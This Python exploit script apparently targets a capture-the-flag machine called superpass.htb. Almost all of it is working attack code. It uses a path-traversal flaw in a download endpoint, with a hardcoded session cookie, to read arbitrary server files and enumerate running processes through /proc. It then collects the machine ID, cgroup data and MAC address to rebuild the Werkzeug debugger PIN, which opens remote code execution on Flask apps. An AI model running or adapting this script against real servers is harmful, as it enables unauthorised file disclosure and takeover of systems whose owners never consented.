#!/usr/bin/env python3
# <  >
import requests, sys, argparse, codecs
import hashlib
from pwn import *
from itertools import chain

COOKIE = "Cookie: remember_token=17|3eb79f3660eb592c6609a6561c8ddac9961e52ecedfff4524c28d4ecfdf86b5f0da5dc07f26c730a50c0f361d4a633311d1d4c7d6e4627812e0a89c636ea29b0; session=.eJwljsFqwzAQRH9F7DkUSSvvav0VvZcQ1tIqNrhNsZxTyL9X0NMwvGF4L7i1XftqHeavF7hzBHxb73o3uMDnbtrN7Y-7237c-XBayoDuXLfufsfmA67v62WcHNZXmM_jaaNtFWZgREP0ylbEKpmmmBDFB2mMlLilFiMGqSoyaONMOUSORSPpotWYCqsoikplzySpUsuNfJTiU8rRQuZlqpITYdaJsHGYfKS6SBEa-rdnt-PfJjC8_wDiFUU9.ZB3PsA.E3RK7oZXEskYMF6MJ-NKgMmRYXA"
URL_BASE = "http://superpass.htb/download?fn=../../"
proxies = { "http": "http://127.0.0.1:8080" }
headers = { "Cookie" : COOKIE }


def usage() -> str:

  file = __file__.rsplit('/', 1)[1]

  usage = "\n"
  usage += f"{file} [-h] [--read] [--npid]"
  usage += f"\n"
  usage += f"\n[+] Read File \n\t{file} --read /etc/passwd"
  usage += f"\n"
  usage += f"\n[+] Enumerate Process \n\t{file} --npid 3000"
  usage += "\n"

  return usage


def init_argparse() -> argparse:

    parse = argparse.ArgumentParser(usage=usage())
    
    parse.add_argument('--read', dest='rfile', type=str, help='Full path of the file')    
    parse.add_argument('--npid', dest='npid', type=int, help='Number of process (pids) to enumerate')
    parse.add_argument('--pin', action='store_true', help='Generate PIN for Debug')

    return parse


def read_file(file:str, out:bool=False) -> None:	

	r = requests.get(URL_BASE + file, 
					headers=headers, 
					proxies=proxies)

	if r.headers['Content-Type'] == "text/csv; charset=utf-8":

		if not out:			
			print(f"[*] File: {file}\n")
			print(r.text)

		return r.text
	

def enum_process(pid) -> None:
	r = requests.session()
	p2 = log.progress(f"Fetching information")

	for i in range(0, pid):

		t = r.get(URL_BASE + f"proc/{i}/cmdline", 
						headers=headers, 
						timeout=10,
						proxies=proxies)

		p2.status("current pid " + str(i))

		if t.status_code != 500 and len(t.text) > 1:
			t = t.text
			print(f"\t[+] pid: {i}")
			print(f"\t[+] command: {t}")

	p2.success('done!')


def get_machine_id() -> str:

    linux = ""

    # machine-id
    files = ["/etc/machine-id", "/proc/sys/kernel/random/boot_id"]
    for i in files:
        value = read_file(i, True).strip()
        if value:
            linux += value
            break

    # cgroup information
    file = "/proc/self/cgroup"
    linux += read_file(file, True).strip().rpartition("/")[2]

    return linux


def generate_pin() -> str:

	probably_public_bits = [
	    'www-data',  # username --> /etc/systemd/system/superpass.service
	    'flask.app', # modname --> Flask
	    'wsgi_app',  # getattr(app, '__name__', getattr(app.__class__, '__name__')) --> By running locally
	    '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None), --> found at /app/venv/lib/python3.10/site-packages/flask/app.py
	]	

	private_bits = [
		# str(uuid.getnode()) -->  /sys/class/net/eth0/address  00:50:56:b9:d8:fd --> pipenv run python -c 'print(0x005056b9d8fd)'
		str(int("0x" + read_file("/sys/class/net/eth0/address", True).replace(":",""), base=16)),
		get_machine_id()
	]

	# source ---> /app/venv/lib/python3.10/site-packages/werkzeug/debug/__init__.py
	h = hashlib.sha1()
	for bit in chain(probably_public_bits, private_bits):
	    if not bit:
	        continue
	    if isinstance(bit, str):
	        bit = bit.encode("utf-8")
	    h.update(bit)
	h.update(b"cookiesalt")

	cookie_name = f"__wzd{h.hexdigest()[:20]}"

	num = None
	if num is None:
	    h.update(b"pinsalt")
	    num = f"{int(h.hexdigest(), 16):09d}"[:9]

	rv = None
	if rv is None:
	    for group_size in 5, 4, 3:
	        if len(num) % group_size == 0:
	            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
	                          for x in range(0, len(num), group_size))
	            break
	    else:
	        rv = num

	# print(rv)

	return rv


if __name__ == "__main__":

	parse = init_argparse()	
	args = parse.parse_args()

	if args.rfile:
		read_file(args.rfile)
	elif args.npid:
		enum_process(args.npid)
	elif args.pin:
		pin = generate_pin()
		print("[+] PIN : ", pin)
	else:
		parse.print_help()


